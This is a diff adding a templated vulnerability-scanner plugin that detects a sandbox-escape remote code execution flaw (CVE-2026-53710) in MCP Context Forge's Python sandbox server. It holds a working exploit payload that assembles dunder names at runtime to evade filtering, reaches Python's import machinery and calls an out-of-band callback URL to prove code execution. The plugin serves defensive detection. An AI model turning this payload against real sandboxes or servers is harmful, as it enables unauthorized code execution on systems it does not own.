@@ -1,0 +1,86 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MCPContextForge_CVE_2026_53710"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-53710"
+  }
+  severity: CRITICAL
+  title: "MCP Context Forge < 1.0.2 - Sandbox Escape & Remote Code Execution"
+  description: "MCP Context Forge python_sandbox_server prior to version 1.0.2 is vulnerable to Remote Code Execution (RCE) via sandbox escape. The execute_code tool exposes raw getattr in safe_builtins and relies on weak string validation (validate_code) to block dangerous dunder strings. An attacker can construct dunder names dynamically at runtime to bypass filters, traverse Python's class hierarchy, reach underlying execution primitives, and execute arbitrary code."
+  recommendation: "Upgrade mcp-contextforge-gateway / python_sandbox_server to version 1.0.2 or later, ensure authentication is enforced on HTTP/SSE transports, and avoid raw getattr exposure in restricted Python sandboxes."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-53710"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_mcp_context_forge"
+  http_request: {
+    method: GET
+    uri: "/openapi.json"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "execute_code" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_sandbox_escape_rce_oob"
+  http_request: {
+    method: POST
+    uri: "/execute_code"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"code\": \"cls_attr = \\\"__\\\" + \\\"class\\\" + \\\"__\\\"; bases_attr = \\\"__\\\" + \\\"bases\\\" + \\\"__\\\"; subclasses_attr = \\\"__\\\" + \\\"subclasses\\\" + \\\"__\\\"; init_attr = \\\"__\\\" + \\\"init\\\" + \\\"__\\\"; glob_attr = \\\"__\\\" + \\\"globals\\\" + \\\"__\\\"; name_attr = \\\"__\\\" + \\\"name\\\" + \\\"__\\\"; b = getattr(getattr(0, cls_attr), bases_attr)[0];\\nfor sub in getattr(b, subclasses_attr)():\\n    if getattr(sub, name_attr) == '_Printer':\\n        try:\\n            init_fn = getattr(sub, init_attr)\\n            g = getattr(init_fn, glob_attr)\\n            s = g['__builtins__']['__' + 'import__']('sys')\\n            g['__builtins__']['__' + 'import__']('urllib.request')\\n            req = s.modules['urllib.request']\\n            req.urlopen('{{ T_CBS_URI }}')\\n            result = 'SUCCESS'\\n            break\\n        except Exception as e:\\n            result = str(e)\"}"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_mcp_context_forge",
+    "check_sandbox_escape_rce_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
